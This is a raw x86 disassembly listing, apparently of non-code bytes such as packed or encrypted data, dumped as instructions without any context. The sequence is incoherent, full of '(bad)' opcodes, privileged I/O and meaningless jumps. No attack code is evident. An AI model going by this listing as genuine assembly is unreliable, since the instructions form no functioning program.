  410cc7:	mov    fs,WORD PTR ds:0xb281178c
  410ccd:	outs   dx,DWORD PTR ds:[esi]
  410cce:	adc    eax,0xd85a85de
  410cd3:	xor    BYTE PTR [ebp-0x5cda41e2],cl
  410cd9:	push   edi
  410cda:	sbb    al,0x1c
  410cdc:	mov    eax,0xbe5b9190
  410ce1:	aas    
  410ce2:	or     BYTE PTR [ebp-0x39be0593],cl
  410ce8:	(bad)  
  410ce9:	mov    ds:0xbd9267e2,al
  410cee:	push   eax
  410cef:	sbb    dl,BYTE PTR [edi+0x72bcf7de]
  410cf5:	jle    0x410d5e
  410cf7:	sub    ecx,DWORD PTR [edi]
  410cf9:	dec    ebx
  410cfa:	jl     0x410d73
  410cfc:	sub    edi,DWORD PTR [esi+0x2d20d373]
  410d02:	mov    ch,0xd2
  410d04:	shl    DWORD PTR [ebp-0x2f29dee4],1
  410d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d0c:	sahf   
  410d0d:	scas   al,BYTE PTR es:[edi]
  410d0e:	retf   0x1826
  410d11:	je     0x410cba
  410d13:	xchg   esp,eax
  410d14:	push   ecx
  410d15:	and    esi,DWORD PTR [ecx]
  410d17:	enter  0x97b5,0xa2
  410d1b:	in     eax,dx
  410d1c:	fs mov ah,0xdf
  410d1f:	mov    ds:0x1475e7c2,al
  410d24:	jo     0x410cca
  410d26:	push   0x5e6c8059
  410d2b:	jns    0x410cf6
  410d2d:	sub    DWORD PTR [esi-0x13bf3957],esi
  410d33:	shl    BYTE PTR [ebp+0x4d0fd04a],1
  410d39:	push   ebp
  410d3a:	mov    ah,0x52
  410d3c:	push   edi
  410d3d:	push   esp
  410d3e:	cmp    al,0xd9
  410d40:	retf   0xaceb
  410d43:	sbb    al,0xbf
  410d45:	jns    0x410d49
  410d47:	adc    eax,0x51214f8
  410d4c:	sbb    dh,dh
  410d4e:	ss push ds
  410d50:	mov    dl,0x7
  410d52:	inc    ecx
  410d53:	ret    0x8a20
  410d56:	jp     0x410d3b
  410d58:	icebp  
  410d59:	xor    eax,0x88be2f99
  410d5e:	mov    dh,0x5d
  410d60:	mov    ds:0x5d831e75,al
  410d65:	mov    ds:0x1fa8fe4d,al
  410d6a:	popa   
  410d6b:	jl     0x410d56
  410d6d:	aad    0x1f
  410d6f:	lds    ebp,FWORD PTR [edx-0x41]
  410d72:	int3   
  410d73:	aas    
  410d74:	push   ds
  410d75:	mov    edi,0x74e220bf
  410d7a:	pop    esp
  410d7b:	fcmovu st,st(0)
  410d7d:	(bad)  
  410d7e:	iret   
  410d7f:	sbb    al,0x3f
  410d81:	sbb    BYTE PTR [ecx+0x5546565b],dl
  410d87:	mov    bh,0x3a
  410d89:	jmp    0x410d91
  410d8b:	adc    eax,0x78acb58b
  410d90:	cs daa 
  410d92:	inc    ebx
  410d93:	pop    edx
  410d94:	int    0x4
  410d96:	mov    eax,ds:0x376ac00d
  410d9b:	mov    ecx,ecx
  410d9d:	in     al,dx
  410d9e:	mov    ds:0x4604fc08,eax
  410da3:	rcl    BYTE PTR ds:0x55a6c972,0x41
  410daa:	scas   eax,DWORD PTR es:[edi]
  410dab:	cmp    bh,BYTE PTR [esi+0x2fabd8ec]
  410db1:	in     eax,0xe4
  410db3:	xchg   ebx,eax
  410db4:	jmp    0x410d89
  410db6:	mov    ah,0x4c
  410db8:	aam    0x7d
  410dba:	or     al,0xa5
  410dbc:	sub    BYTE PTR [esi],bh
  410dbe:	add    BYTE PTR [edi-0x30d0c53f],ch
  410dc4:	sar    BYTE PTR [eax+0x1c],0xf2
  410dc8:	jnp    0x410d7a
  410dca:	imul   ecx,ebp,0x9b3c7786
  410dd0:	push   ebp
  410dd1:	stos   DWORD PTR es:[edi],eax
  410dd2:	(bad)  
  410dd3:	push   ebp
  410dd4:	jge    0x410d86
  410dd6:	sbb    esi,0x33e3adbd
  410ddc:	ror    BYTE PTR [ecx],0x6b
  410ddf:	or     eax,0xfb786c55
  410de4:	sbb    BYTE PTR [esi+0x54],bl
  410de7:	jp     0x410e4a
  410de9:	sahf   
  410dea:	mov    cl,0x3c
  410dec:	or     bl,dh
  410dee:	dec    eax
  410def:	sbb    al,0x1e
  410df1:	rcl    BYTE PTR [esp+edx*4-0x26],0x44
  410df6:	int3   
  410df7:	in     al,dx
  410df8:	call   0x5b11:0x1c5755fd
  410dff:	cs xor bl,bh
  410e02:	lods   al,BYTE PTR ds:[esi]
  410e03:	jp     0xe1cce01
  410e09:	test   BYTE PTR [ebx],dh
  410e0b:	clc    
  410e0c:	xor    al,bh
  410e0e:	xchg   esp,eax
  410e0f:	push   0x281f2b8e
  410e14:	(bad)  
  410e15:	adc    bl,BYTE PTR [ebp-0x7f]
  410e18:	punpcklwd mm0,DWORD PTR [edx-0x22]
  410e1c:	cmp    dh,bl
  410e1e:	imul   ebx,DWORD PTR [esi-0x77],0xfdc033a1
  410e25:	mov    ss,WORD PTR [ebx+ebx*4+0xd]
  410e29:	jno    0x410dfa
  410e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e2c:	mov    ecx,DWORD PTR [ebx+0x31542b84]
  410e32:	ja     0x410e4d
  410e34:	mov    ds:0x86aeae97,eax
  410e39:	pop    ebx
  410e3a:	mov    BYTE PTR [eax-0x4d],dh
  410e3d:	jne    0x410e45
  410e3f:	mov    ch,0xff
  410e41:	xchg   BYTE PTR [edi],ah
  410e43:	stos   BYTE PTR es:[edi],al
  410e44:	neg    ah
  410e46:	mov    esi,0x3f3933a
  410e4b:	inc    ebx
  410e4c:	dec    esp
  410e4d:	rcr    ebp,0x5a
  410e50:	test   edi,edi
  410e52:	mov    bh,0x57
  410e54:	and    dl,BYTE PTR [ecx]
  410e56:	pushf  
  410e57:	popa   
  410e58:	enter  0x78c6,0xeb
  410e5c:	daa    
  410e5d:	ins    BYTE PTR es:[edi],dx
  410e5e:	lods   eax,DWORD PTR ds:[esi]
  410e5f:	push   edi
  410e60:	fdivp  st(2),st
  410e62:	pop    ebx
  410e63:	add    BYTE PTR [ecx+0x6f],bl
  410e66:	das    
  410e67:	xchg   ebx,eax
  410e68:	adc    ah,BYTE PTR fs:[ebx+0x73646e5e]
  410e6f:	xor    cl,BYTE PTR [esi-0x2fc8b6da]
  410e75:	pop    ecx
  410e76:	ret    
  410e77:	clc    
  410e78:	ret    0xaa2f
  410e7b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410e7d:	int    0x74
  410e7f:	stc    
  410e80:	or     esi,DWORD PTR [esi]
  410e82:	(bad)  
  410e84:	xor    DWORD PTR [ebx+0x3e],eax
  410e87:	mov    edi,0x61b2455d
  410e8c:	iret   
  410e8d:	and    DWORD PTR [esi+0x30],eax
  410e90:	jmp    0xa523:0xf55b389a
  410e97:	lods   eax,DWORD PTR ds:[esi]
  410e98:	jnp    0x410ec6
  410e9a:	or     eax,ebp
  410e9c:	outs   dx,BYTE PTR ds:[esi]
  410e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e9e:	or     eax,0xbe766e89
  410ea3:	mov    bh,BYTE PTR [ecx]
  410ea5:	cdq    
  410ea6:	ins    BYTE PTR es:[edi],dx
  410ea7:	in     eax,dx
  410ea8:	or     dh,BYTE PTR [ecx+0x59]
  410eab:	or     esi,esi
  410ead:	int3   
  410eae:	imul   ecx,ebx,0x57e35651
  410eb4:	and    BYTE PTR [eax+0x22],0x7a
  410eb8:	sub    BYTE PTR [ecx-0x611eab24],0x7c
  410ebf:	(bad)  
  410ec1:	adc    ebp,DWORD PTR [edx+0x724332b0]
  410ec7:	jmp    0xe0fa:0x5e6ec3cf
  410ece:	jmp    0x410f22
  410ed0:	adc    al,0xb9
  410ed2:	xchg   esp,eax
  410ed3:	int    0x59
  410ed5:	xchg   ecx,eax
  410ed6:	sbb    DWORD PTR [eax],edx
  410ed8:	test   DWORD PTR ds:0xf903120,edx
  410ede:	xchg   DWORD PTR [ecx],ebx
  410ee0:	test   eax,0xda0c797c
  410ee5:	sbb    DWORD PTR [edx+0x40],eax
  410ee8:	cmp    BYTE PTR [ecx-0x13241322],al
  410eee:	arpl   WORD PTR [ebx],dx
  410ef0:	enter  0xb8ae,0x1b
  410ef4:	je     0x410edb
  410ef6:	dec    edi
  410ef7:	jg     0x410f32
  410ef9:	stc    
  410efa:	ret    0x8fe
  410efd:	jbe    0x410f1a
  410eff:	frstor [edi-0x28]
  410f02:	nop
  410f03:	(bad)  
  410f04:	fsub   QWORD PTR [ebp+0x43]
  410f07:	mov    bl,0x1e
  410f09:	bound  ecx,QWORD PTR [eax-0x3e]
  410f0c:	add    al,0xf7
  410f0e:	(bad)  
  410f0f:	push   ecx
  410f10:	xor    bl,dl
  410f12:	loope  0x410ebd
  410f14:	retf   
  410f15:	mov    esp,0x5d513ef2
  410f1a:	xchg   esp,eax
  410f1b:	ret    0x8322
  410f1e:	(bad)  
  410f1f:	mov    ch,0xd7
  410f21:	or     cl,al
  410f23:	rep stos BYTE PTR es:[edi],al
  410f25:	xchg   esp,eax
  410f26:	das    
  410f27:	sub    eax,0x22caf020
  410f2c:	sub    DWORD PTR fs:[edi],esp
  410f2f:	fimul  DWORD PTR fs:[edi]
  410f32:	mov    ds:0x53a38e2a,al
  410f37:	cli    
  410f38:	je     0x410f76
  410f3a:	fld    QWORD PTR [eax+0x47b8571]
  410f40:	xlat   BYTE PTR ds:[ebx]
  410f41:	mov    ah,0x16
  410f43:	mov    al,0x10
  410f45:	add    ecx,DWORD PTR [ebx+0x46]
  410f48:	push   eax
  410f49:	push   eax
  410f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f4b:	repnz fistp WORD PTR [eax-0x19]
  410f4f:	nop
  410f50:	xchg   DWORD PTR [edx+0x566abd22],esp
  410f56:	push   cs
  410f57:	xor    edi,DWORD PTR [ecx-0x468ceabe]
  410f5d:	jns    0x410f41
  410f5f:	jge    0x410f5a
  410f61:	xor    BYTE PTR [esi+0x283719b3],0x34
  410f68:	push   ebp
  410f69:	idiv   BYTE PTR [ecx+ebx*1-0x25]
  410f6d:	dec    ebp
  410f6e:	mov    BYTE PTR [ebp+0xc53eb13],al
  410f74:	dec    ecx
  410f75:	scas   eax,DWORD PTR es:[edi]
  410f76:	outs   dx,DWORD PTR ds:[esi]
  410f77:	mov    bh,0x0
  410f79:	aaa    
  410f7a:	scas   eax,DWORD PTR es:[edi]
  410f7b:	outs   dx,BYTE PTR ds:[esi]
  410f7c:	test   DWORD PTR [ebp-0x41dde46d],esp
  410f82:	add    eax,0xde7981ad
  410f87:	loopne 0x411007
  410f89:	shl    dl,1
  410f8b:	ins    DWORD PTR es:[edi],dx
  410f8c:	jp     0x410f25
  410f8e:	fwait
  410f8f:	in     al,dx
  410f90:	jmp    0x86071717
  410f95:	xor    eax,0x437c982c
  410f9a:	cmp    esp,ebp
  410f9c:	jmp    0x5897e5ed
  410fa1:	jo     0x410f8c
  410fa3:	minps  xmm5,xmm5
  410fa6:	xchg   esi,eax
  410fa7:	test   DWORD PTR [ecx],esi
  410fa9:	leave  
  410faa:	dec    ebp
  410fab:	ins    BYTE PTR es:[edi],dx
  410fac:	ins    BYTE PTR es:[edi],dx
  410fad:	pop    esi
  410fae:	test   eax,0x15775692
  410fb3:	ret    0x5538
  410fb6:	sub    eax,DWORD PTR [edx-0x15]
  410fb9:	in     eax,dx
  410fba:	nop
  410fbb:	dec    ebx
  410fbc:	fstp   TBYTE PTR [esi]
  410fbe:	and    esp,DWORD PTR [eax]
  410fc0:	test   eax,0x3cb1204f
  410fc5:	xor    al,0x91
  410fc7:	(bad)  
  410fc8:	xchg   edx,eax
  410fc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fcb:	js     0x410f91
  410fcd:	push   eax
  410fce:	jg     0x41101d
  410fd0:	pop    edi
  410fd1:	xchg   esp,eax
  410fd2:	dec    esi
  410fd3:	dec    ecx
  410fd4:	mov    DWORD PTR [ebx+esi*8-0x1b74cea6],ecx
  410fdb:	push   es
  410fdc:	repz mov ds:0x4e13fa0d,al
  410fe2:	xchg   ecx,eax
  410fe3:	sub    eax,0xe068a219
  410fe8:	data16 stos BYTE PTR es:[edi],al
  410fea:	xchg   esi,eax
  410feb:	push   esi
  410fec:	jb     0x411020
  410fee:	popf   
  410fef:	push   cs
  410ff0:	repnz bound edi,QWORD PTR ds:[ecx-0x9]
  410ff5:	fwait
  410ff6:	pop    esp
  410ff7:	popa   
  410ff8:	frstor [eax]
  410ffa:	sbb    esp,DWORD PTR [edx+0x60]
  410ffd:	sbb    bl,dl
  410fff:	bound  esi,QWORD PTR [ebp+0x46]
  411002:	adc    esi,eax
  411004:	pop    es
  411005:	nop
  411006:	outs   dx,BYTE PTR ds:[esi]
  411007:	(bad)  [ecx-0x34]
  41100a:	dec    esi
  41100b:	clc    
  41100c:	sub    DWORD PTR [esi+esi*4-0x6b1b52c4],edi
  411013:	jp     0x411074
  411015:	mov    al,ds:0xa5fe263d
  41101a:	in     al,0x1c
  41101c:	adc    eax,DWORD PTR [esi+0x75]
  41101f:	or     al,0xcb
  411021:	fsubr  QWORD PTR [edx-0x5942f4bf]
  411027:	es rcl ch,cl
  41102a:	or     eax,0x5c715929
  41102f:	pushf  
  411030:	mov    al,0x62
  411032:	out    0xcf,al
  411034:	dec    ebx
  411035:	dec    ebx
  411036:	cmp    DWORD PTR [esi+0x250e1054],ecx
  41103c:	mov    ds:0x1b21048,al
  411041:	cwde   
  411042:	mov    ebp,0x5f08ce79
  411047:	stos   BYTE PTR es:[edi],al
  411048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411049:	jbe    0x4110b9
  41104b:	pushf  
  41104c:	or     edx,DWORD PTR [eax+0x3554b2b5]
  411052:	pop    es
  411053:	(bad)  
  411054:	and    bl,bh
  411056:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  411058:	mov    eax,0xaf2a22a8
  41105d:	and    DWORD PTR [esi],edi
  41105f:	mov    bl,0x3c
  411061:	stc    
  411062:	mov    ds:0xf9817530,al
  411067:	loopne 0x411030
  411069:	iret   
  41106a:	pop    eax
  41106b:	sbb    BYTE PTR [edi+0x78394db5],ch
  411071:	clc    
  411072:	xor    BYTE PTR [eax+0x6a87386d],0x48
  411079:	imul   esp,DWORD PTR [ebp-0x3779216b],0x68163cba
  411083:	mov    ebx,0x86293319
  411088:	dec    esp
  411089:	dec    esp
  41108a:	rcl    BYTE PTR [eax+0x68],1
  41108d:	push   cs
  41108e:	mov    ebx,0x8caf3303
  411093:	lods   al,BYTE PTR ds:[esi]
  411094:	jnp    0x411110
  411096:	xchg   ebx,eax
  411097:	mov    bl,BYTE PTR [ecx]
  411099:	neg    DWORD PTR [ebx+0x24f5fbea]
  41109f:	arpl   ax,sp
  4110a1:	sub    DWORD PTR [ebp+0x61],eax
  4110a4:	jle    0x411106
  4110a6:	add    eax,0xc59fd0c1
  4110ab:	pop    edi
  4110ac:	test   bh,ch
  4110ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110af:	sti    
  4110b0:	ss in  al,dx
  4110b2:	popa   
  4110b3:	sbb    edx,DWORD PTR [edi]
  4110b5:	mov    dh,0x58
  4110b7:	pop    ds
  4110b8:	stc    
  4110b9:	outs   dx,BYTE PTR ds:[esi]
  4110ba:	stos   DWORD PTR es:[edi],eax
  4110bb:	jl     0x4110ea
  4110bd:	jle    0x41113b
  4110bf:	push   ds
  4110c0:	mov    cl,0xa0
  4110c2:	(bad)  
  4110c3:	jp     0x4110be
  4110c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c6:	inc    ecx
  4110c7:	jmp    FWORD PTR [eax-0x2552c6a2]
  4110cd:	popf   
  4110ce:	fidiv  WORD PTR [edi+0x79162ec5]
  4110d4:	sub    eax,0xc18fc5da
  4110d9:	push   esp
  4110da:	xchg   ebx,eax
  4110db:	lahf   
  4110dc:	frstor [edi+0x53]
  4110df:	or     esp,ebx
  4110e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110e2:	push   cs
  4110e3:	call   0xdc101e23
  4110e8:	push   ds
  4110e9:	test   al,0xf5
  4110eb:	sar    BYTE PTR [esi-0x26],0x9c
  4110ef:	daa    
  4110f0:	and    al,0xf2
  4110f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110f3:	lahf   
  4110f4:	repnz dec DWORD PTR [esi]
  4110f7:	loop   0x41112f
  4110f9:	cs cmp edi,ebp
  4110fc:	fadd   DWORD PTR [esi]
  4110fe:	mov    cl,0xa6
  411100:	in     eax,dx
  411101:	dec    edx
  411102:	add    eax,0x8bfd631c
  411107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411108:	inc    esp
  411109:	mov    esi,0x5c4f3561
  41110e:	stos   DWORD PTR es:[edi],eax
  41110f:	lea    eax,[ecx+0x2]
  411112:	jle    0x41110c
  411114:	or     al,0x38
  411116:	sub    bl,BYTE PTR [edx+ebx*8]
  411119:	stc    
  41111a:	fadd   QWORD PTR fs:[edi-0x7d427c41]
  411121:	mov    esi,DWORD PTR [edi+0x7a]
  411124:	jl     0x4110d9
  411126:	mov    esi,0xb27ac914
  41112b:	inc    esi
  41112c:	add    eax,0x790b078a
  411131:	or     ebp,0x70
  411134:	ror    ebx,cl
  411136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411137:	aaa    
  411138:	inc    ebx
  411139:	lock adc edx,DWORD PTR [ecx]
  41113c:	xchg   esi,eax
  41113d:	cmc    
  41113e:	(bad)  
  41113f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411140:	xor    al,0xbb
  411142:	jae    0x41117a
  411144:	push   cs
  411145:	hlt    
  411146:	inc    esp
  411147:	mov    ecx,0x9ac632be
  41114c:	popa   
  41114d:	xor    eax,0x6ad3758b
  411152:	test   eax,0x4b6a1d02
  411157:	push   ecx
  411158:	lods   al,BYTE PTR ds:[esi]
  411159:	into   
  41115a:	add    esp,edx
  41115c:	scas   eax,DWORD PTR es:[edi]
  41115d:	add    edi,edi
  41115f:	cmc    
  411160:	mov    esi,0xcf6a1582
  411165:	scas   al,BYTE PTR es:[edi]
  411166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411167:	mov    ?,WORD PTR [eax]
  411169:	push   0x9edc804
  41116e:	in     eax,dx
  41116f:	pop    edi
  411170:	add    edi,edi
  411172:	add    DWORD PTR [edi],esi
  411174:	mov    eax,ds:0x8fed9f16
  411179:	fidiv  WORD PTR [edx-0x3bf352b1]
  41117f:	sub    ch,ah
  411181:	dec    esp
  411182:	jno    0x4111d4
  411184:	aaa    
  411185:	cdq    
  411186:	push   eax
  411187:	cwde   
  411188:	push   eax
  411189:	popf   
  41118a:	mov    eax,0x262bbb1e
  41118f:	pusha  
  411190:	pop    esi
  411191:	xor    BYTE PTR [edi+0x32acbfb7],0x2f
  411198:	cwde   
  411199:	(bad)  
  41119a:	repnz pop ebx
  41119c:	dec    edi
  41119d:	mov    edx,DWORD PTR [edx+0x57844b8c]
  4111a3:	or     al,0x21
  4111a5:	retf   0x5c8f
  4111a8:	out    0x5c,al
  4111aa:	lds    esp,FWORD PTR [edi]
  4111ac:	loopne 0x411178
  4111ae:	mov    al,ds:0xc436c9b5
  4111b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111b4:	jb     0x41121f
  4111b6:	mov    al,0x1d
  4111b8:	fcom   st(1)
  4111ba:	sub    eax,0xc95c5cdc
  4111bf:	jae    0x41121d
  4111c1:	mov    bl,0x2e
  4111c3:	fdivr  QWORD PTR [ebp+0x2d81bc4f]
  4111c9:	and    esp,edx
  4111cb:	add    bl,bl
  4111cd:	data16 (bad) 
  4111cf:	mov    ch,0x2c
  4111d1:	or     ch,bl
  4111d3:	pop    edi
  4111d4:	(bad)  
  4111d6:	push   esp
  4111d7:	call   0xf3cf:0xa3beee4
  4111de:	ins    BYTE PTR es:[edi],dx
  4111df:	sub    eax,0x11143d18
  4111e4:	push   ss
  4111e5:	cmp    edi,DWORD PTR [edi+ecx*8]
  4111e8:	ins    DWORD PTR es:[edi],dx
  4111e9:	pop    ds
  4111ea:	mov    edi,DWORD PTR [ebp+0x5b]
  4111ed:	push   edi
  4111ee:	je     0x411174
  4111f0:	push   edx
  4111f1:	in     al,dx
  4111f2:	sbb    ecx,DWORD PTR [edx-0x4f113510]
  4111f8:	iret   
  4111f9:	mov    edi,0x9d90e8dc
  4111fe:	out    0x32,al
  411200:	fsubr  QWORD PTR [edx]
  411202:	daa    
  411203:	in     al,dx
  411204:	(bad)  
  411205:	and    eax,0x8f0ebe4e
  41120a:	(bad)  
  41120b:	jmp    0xc8f49fc5
  411210:	xor    eax,0x8c585551
  411215:	mov    DWORD PTR [eax+0x3d],edi
  411218:	inc    BYTE PTR [edi+0x30]
  41121b:	xor    esp,DWORD PTR [edi+0x162e8211]
  411221:	xchg   DWORD PTR [ecx],esp
  411223:	inc    edx
  411224:	dec    esp
  411225:	jne    0x4111d3
  411227:	sub    al,0x6b
  411229:	push   ebx
  41122a:	fcmovnbe st,st(0)
  41122c:	scas   eax,DWORD PTR es:[edi]
  41122d:	loope  0x4111c1
  41122f:	cs ds cli 
  411232:	push   ss
  411233:	in     eax,dx
  411234:	inc    edx
  411235:	cld    
  411236:	push   esi
  411237:	xor    esp,DWORD PTR [esi+ebp*8]
  41123a:	ss ret 0x3c6f
  41123e:	mov    dh,0x95
  411240:	mov    esi,0x53c2248d
  411245:	sub    dh,BYTE PTR [ecx+0x6f]
  411248:	es dec ebx
  41124a:	mov    ds:0x56a988de,eax
  41124f:	sbb    DWORD PTR [edi+0x7a],eax
  411252:	mov    DWORD PTR [ecx-0x51aea496],ebp
  411258:	aaa    
  411259:	sahf   
  41125a:	stos   BYTE PTR es:[edi],al
  41125b:	popf   
  41125c:	or     eax,0x4e22f60c
  411261:	push   edx
  411262:	inc    esi
  411263:	pusha  
  411264:	sub    ebp,0xfffffff5
  411267:	cli    
  411268:	test   BYTE PTR [ebx],dh
  41126a:	fsub   st(0),st
  41126c:	jl     0x41126c
  41126e:	mov    dl,0x6c
  411270:	fiadd  WORD PTR [esi-0x21]
  411273:	sub    edx,esi
  411275:	push   ecx
  411276:	into   
  411277:	lds    esi,FWORD PTR [ebx+0x26195e4d]
  41127d:	push   0x15
  41127f:	pop    edi
  411280:	push   edi
  411281:	lea    esi,[ecx+0x60]
  411284:	aad    0x7c
  411286:	pop    es
  411287:	dec    edi
  411288:	pushf  
  411289:	cmp    eax,DWORD PTR [edx+0x14]
  41128c:	sbb    eax,0x5cfa8971
  411291:	jo     0x411271
  411293:	cmp    BYTE PTR [esi-0x6],ch
  411296:	push   0x70
  411298:	jns    0x411294
  41129a:	and    al,0x26
  41129c:	adc    eax,0xbebe5894
  4112a1:	in     al,0xe3
  4112a3:	sbb    eax,0x8ed3fa3e
  4112a8:	xlat   BYTE PTR ds:[ebx]
  4112a9:	jae    0x411232
  4112ab:	fisubr DWORD PTR [esi+esi*2+0x3f]
  4112af:	(bad)  
  4112b0:	(bad)  
  4112b2:	dec    esi
  4112b3:	adc    DWORD PTR [ebx+0x5d],esi
  4112b6:	test   BYTE PTR [ebp+0x6e],bh
  4112b9:	enter  0x2f78,0xf7
  4112bd:	(bad)  
  4112be:	jmp    0x8a9291bc
  4112c3:	fild   DWORD PTR [eax-0x43]
  4112c6:	sbb    BYTE PTR ds:0xc7620883,bh
  4112cc:	dec    dx
  4112ce:	lods   eax,DWORD PTR ds:[esi]
  4112cf:	dec    edi
  4112d0:	fwait
  4112d1:	sub    ah,al
  4112d3:	dec    esp
  4112d4:	and    esp,DWORD PTR [eax]
  4112d6:	pop    esp
  4112d7:	sti    
  4112d8:	adc    DWORD PTR [ecx],0xb79204a9
  4112de:	or     BYTE PTR [ecx+0x1fd7210e],bh
  4112e4:	xor    ah,BYTE PTR [edi+edx*4+0x21]
  4112e8:	out    0xd0,eax
  4112ea:	jbe    0x411290
  4112ec:	mov    al,ds:0x1f6dc0ca
  4112f1:	and    BYTE PTR [esi+edx*8+0x67],dh
  4112f5:	repz mov ds:0x503a106f,al
  4112fb:	xor    al,0xa8
  4112fd:	je     0x4112da
  4112ff:	or     al,0xd4
  411301:	mov    cl,0x62
  411303:	ret    0x79f9
  411306:	jne    0x4112b6
  411308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411309:	cdq    
  41130a:	push   ebp
  41130b:	mov    esp,0x29f88f3a
  411310:	adc    DWORD PTR [ecx+ebp*4-0x1b],esp
  411314:	ins    DWORD PTR es:[edi],dx
  411315:	mov    edx,0x84ab1cea
  41131a:	xchg   DWORD PTR ss:[ebp+0x74],esp
  41131e:	jp     0x411336
  411320:	and    edi,DWORD PTR es:[edx+0x257d196d]
  411327:	loope  0x411357
  411329:	les    edx,FWORD PTR [esi+0x1ee7ae81]
  41132f:	add    al,bh
  411331:	push   ecx
  411332:	cdq    
  411333:	outs   dx,DWORD PTR ds:[esi]
  411334:	(bad)  
  411336:	xchg   ecx,eax
  411337:	(bad)  
  411338:	push   DWORD PTR [edx]
  41133a:	mov    eax,ds:0x938f89c4
  41133f:	dec    ebx
  411340:	xchg   edi,eax
  411341:	jmp    0x8cee:0xde4fc370
  411348:	inc    ebx
  411349:	push   esp
  41134a:	pop    esi
  41134b:	xchg   DWORD PTR [esi],edx
  41134d:	cmp    BYTE PTR [eax-0x7a],cl
  411350:	xor    edi,DWORD PTR ds:0x43a6b4d8
  411356:	outs   dx,BYTE PTR ds:[esi]
  411357:	cdq    
  411358:	add    bl,BYTE PTR [ebx]
  41135a:	addr16 xchg edx,eax
  41135c:	sbb    eax,DWORD PTR [edx]
  41135e:	ror    BYTE PTR [ebx+esi*1-0x10936e0c],cl
  411365:	and    DWORD PTR ds:0xf8bbb39a,ebx
  41136b:	mov    al,ds:0x1ce5021e
  411370:	lods   al,BYTE PTR ds:[esi]
  411371:	push   cs
  411372:	push   edx
  411373:	outs   dx,BYTE PTR ds:[esi]
  411374:	imul   edx,DWORD PTR [ebp-0x21],0x1d
  411378:	pop    edi
  411379:	sbb    ebp,DWORD PTR [edi+0x6f]
  41137c:	mov    dh,0xcd
  41137e:	pop    edi
  41137f:	cmc    
  411380:	cli    
  411381:	sbb    eax,0xed1af97c
  411386:	popf   
  411387:	in     eax,dx
  411388:	cmp    DWORD PTR [edx],0xfab178ed
  41138e:	retf   0xd6f8
  411391:	jecxz  0x4113c0
  411393:	adc    al,0x1e
  411395:	in     eax,0xda
  411397:	mov    ds:0x128a0cd0,eax
  41139c:	pop    edi
  41139d:	fisubr DWORD PTR [ecx]
  41139f:	pusha  
  4113a0:	leave  
  4113a1:	in     eax,0x8a
  4113a3:	mov    eax,0xa17fa481
  4113a8:	fistp  DWORD PTR [edx+0x29]
  4113ab:	adc    DWORD PTR [esi+0x5b61592a],eax
  4113b1:	ds jl  0x411395
  4113b4:	pusha  
  4113b5:	clc    
  4113b6:	push   esi
  4113b7:	aas    
  4113b8:	idiv   DWORD PTR [ecx]
  4113ba:	ja     0x41140c
  4113bc:	jmp    0x41139b
  4113be:	dec    ebp
  4113bf:	lock sub al,0x27
  4113c2:	stos   DWORD PTR es:[edi],eax
  4113c3:	add    esp,DWORD PTR cs:[esi+0x7]
  4113c7:	mov    ecx,0x2f55830d
  4113cc:	inc    edx
  4113cd:	mov    esi,0xa29a5a18
  4113d2:	test   DWORD PTR [ecx-0x7e],0x503b26f6
  4113d9:	cmc    
  4113da:	mov    ah,0x7a
  4113dc:	loopne 0x41136c
  4113de:	sbb    edx,0x11
  4113e1:	sbb    edi,esi
  4113e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113e4:	aam    0xe4
  4113e6:	jg     0x41138e
  4113e8:	jecxz  0x411468
  4113ea:	push   cs
  4113eb:	mov    DWORD PTR [ebx],ecx
  4113ed:	sbb    DWORD PTR ds:0x5ee34f3f,ecx
  4113f3:	out    dx,eax
  4113f4:	das    
  4113f5:	mov    ds:0x3bfa816c,al
  4113fa:	xchg   BYTE PTR [esi+ebp*4-0xd445527],al
  411401:	jb     0x411396
  411403:	into   
  411404:	mov    ch,0xe3
  411406:	inc    esi
  411407:	jecxz  0x41147c
  411409:	int3   
  41140a:	pushf  
  41140b:	jle    0x41144b
  41140d:	out    dx,al
  41140e:	inc    eax
  41140f:	and    ecx,DWORD PTR [ebx]
  411411:	jo     0x411431
  411413:	sub    cl,BYTE PTR [eax+0x20805f99]
  411419:	xchg   DWORD PTR [ebp+0x6],esi
  41141c:	pop    edx
  41141d:	aas    
  41141e:	cmp    eax,0xeb8b2f9a
  411423:	add    eax,0x9b5f72bd
  411428:	inc    edi
  411429:	mov    ds:0x4a2e85aa,al
  41142e:	pop    ss
  41142f:	imul   edi,DWORD PTR ds:0xac47f43d,0x45
  411436:	dec    esp
  411437:	xlat   BYTE PTR ds:[ebx]
  411438:	push   ds
  411439:	jno    0x4113c4
  41143b:	arpl   WORD PTR [edx+ecx*1],di
  41143e:	repz jno 0x41142e
  411441:	xchg   BYTE PTR [ebx],dl
  411443:	pop    esp
  411444:	xlat   BYTE PTR ds:[ebx]
  411445:	cld    
  411446:	mov    edx,0x6a529ea3
  41144b:	call   FWORD PTR [edx]
  41144d:	cdq    
  41144e:	dec    BYTE PTR [esi]
  411450:	test   al,0x1f
  411452:	(bad)  
  411453:	leave  
  411454:	jg     0x41145d
  411456:	mov    ebp,DWORD PTR [ebx-0x61e9e35d]
  41145c:	or     edi,DWORD PTR [ebx-0x5a]
  41145f:	cmc    
  411460:	gs fsub st,st(6)
  411463:	(bad)
